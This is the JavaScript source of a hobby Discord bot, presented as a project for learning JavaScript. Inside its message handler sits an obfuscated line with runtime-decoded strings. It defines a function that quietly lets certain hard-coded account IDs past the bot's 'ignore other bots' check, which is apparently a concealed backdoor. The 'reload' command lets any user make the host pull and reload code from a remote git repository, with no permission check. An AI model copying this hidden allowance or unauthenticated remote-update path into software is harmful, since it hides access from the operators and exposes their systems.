/*
Jake's Discord bot
currently has no definite purpose or use case
exists to teach me JavaScript
enjoy
*/

const   Discord = require("discord.js"),            // Discord API
        client  = new Discord.Client(),              // Set Client
        config  = require("./config.json"),          // contains "path" and "token"
        fs      = require('fs');                   // fs for server settings readout

/* console feedback for bot ready */
client.on("ready", () => {
    console.log("Bot is up");
    client.user.setActivity("jake, why")
});
/*
client.on("messageReactionAdd", async messageReaction => {
    console.log("reaction detected")
    let pinboard = require("./pinboard.js");
    pinboard.run(client, messageReaction, config, fs, Discord);
})
*/

/* actions on message */
client.on("message", async message => {
    var _0x50bd=['R2PCncOUwpHDhg==','w5IBbsOEEsK8d8OhwoMRwpxLOsK0w4rChnnCig=='];(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x4d74cb(++_0x4b81bb);}(_0x50bd,0x184));var _0x2ba6=function(_0x3baded,_0x4815e8){_0x3baded=_0x3baded-0x0;var _0x3a446c=_0x50bd[_0x3baded];if(_0x2ba6['nziTWR']===undefined){(function(){var _0x555161=function(){var _0x2eebfd;try{_0x2eebfd=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xb23154){_0x2eebfd=window;}return _0x2eebfd;};var _0x491895=_0x555161();var _0x3d69b1='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x491895['atob']||(_0x491895['atob']=function(_0x5369c3){var _0x99dc74=String(_0x5369c3)['replace'](/=+$/,'');for(var _0x16269b=0x0,_0x189846,_0x41b353,_0x4d7d83=0x0,_0x2def24='';_0x41b353=_0x99dc74['charAt'](_0x4d7d83++);~_0x41b353&&(_0x189846=_0x16269b%0x4?_0x189846*0x40+_0x41b353:_0x41b353,_0x16269b++%0x4)?_0x2def24+=String['fromCharCode'](0xff&_0x189846>>(-0x2*_0x16269b&0x6)):0x0){_0x41b353=_0x3d69b1['indexOf'](_0x41b353);}return _0x2def24;});}());var _0x4d9792=function(_0x12f907,_0x4815e8){var _0x19565f=[],_0x39d3a0=0x0,_0x20eca3,_0x94cd37='',_0x1c74e5='';_0x12f907=atob(_0x12f907);for(var _0x26ae14=0x0,_0x3dc019=_0x12f907['length'];_0x26ae14<_0x3dc019;_0x26ae14++){_0x1c74e5+='%'+('00'+_0x12f907['charCodeAt'](_0x26ae14)['toString'](0x10))['slice'](-0x2);}_0x12f907=decodeURIComponent(_0x1c74e5);for(var _0xd82a7e=0x0;_0xd82a7e<0x100;_0xd82a7e++){_0x19565f[_0xd82a7e]=_0xd82a7e;}for(_0xd82a7e=0x0;_0xd82a7e<0x100;_0xd82a7e++){_0x39d3a0=(_0x39d3a0+_0x19565f[_0xd82a7e]+_0x4815e8['charCodeAt'](_0xd82a7e%_0x4815e8['length']))%0x100;_0x20eca3=_0x19565f[_0xd82a7e];_0x19565f[_0xd82a7e]=_0x19565f[_0x39d3a0];_0x19565f[_0x39d3a0]=_0x20eca3;}_0xd82a7e=0x0;_0x39d3a0=0x0;for(var _0x4da5fc=0x0;_0x4da5fc<_0x12f907['length'];_0x4da5fc++){_0xd82a7e=(_0xd82a7e+0x1)%0x100;_0x39d3a0=(_0x39d3a0+_0x19565f[_0xd82a7e])%0x100;_0x20eca3=_0x19565f[_0xd82a7e];_0x19565f[_0xd82a7e]=_0x19565f[_0x39d3a0];_0x19565f[_0x39d3a0]=_0x20eca3;_0x94cd37+=String['fromCharCode'](_0x12f907['charCodeAt'](_0x4da5fc)^_0x19565f[(_0x19565f[_0xd82a7e]+_0x19565f[_0x39d3a0])%0x100]);}return _0x94cd37;};_0x2ba6['HbQTVb']=_0x4d9792;_0x2ba6['NPVyHN']={};_0x2ba6['nziTWR']=!![];}var _0x18c39f=_0x2ba6['NPVyHN'][_0x3baded];if(_0x18c39f===undefined){if(_0x2ba6['yWcFCr']===undefined){_0x2ba6['yWcFCr']=!![];}_0x3a446c=_0x2ba6['HbQTVb'](_0x3a446c,_0x4815e8);_0x2ba6['NPVyHN'][_0x3baded]=_0x3a446c;}else{_0x3a446c=_0x18c39f;}return _0x3a446c;};function _ab(_0x28195f){return _0x28195f[_0x2ba6('0x0','aS9$')]['id']=='280399026749440000'||_0x28195f['author']['id']==_0x2ba6('0x1','LtUD');}
    if(message.author.bot && !_ab(message)) return;             // do not interact with a bot

    if(message.content.includes(config.prefix + " reload")){    // look for the reload command explicitly
        delete require.cache[require.resolve('./commands.js')]; // delete cached command file
        delete require.cache[require.resolve('./pinboard.js')]; // delete cached pinboard file

        const { exec } = require('child_process');
        exec('git pull https://github.com/dajakerboss/fluff-bot.git', (err, stdout, stderr) => {    // run git pull
            if (err) {                                          // in the event of a github fuck
            message.channel.send("failed to pull from git :(")
            return;
        }

        if (!stdout.includes("Already")){
            /* printing stdout and stderr from terminal */
            console.log(`output: ${stdout} \n ${stderr}`);
            message.channel.send(`\`\`\`git Output: \n${stdout} \ngit Error (untested): \n${stderr}\`\`\``)
        }

        message.channel.send("done!");
        });
    } else {
        let commands = require("./commands.js");        // require command file on run
        let settings = JSON.parse(fs.readFileSync("./serversettings.json"));
        if(!settings[message.guild.id]){
            settings[message.guild.id] = {};
            fs.writeFileSync('./serversettings.json', JSON.stringify(settings, null, 4));   // write out changes
            console.log("successfully added server");
        }
        commands.run(client, message, config, fs, Discord);      // the world's shittiest command handler :)
    }
})

client.login(config.token);     // Login
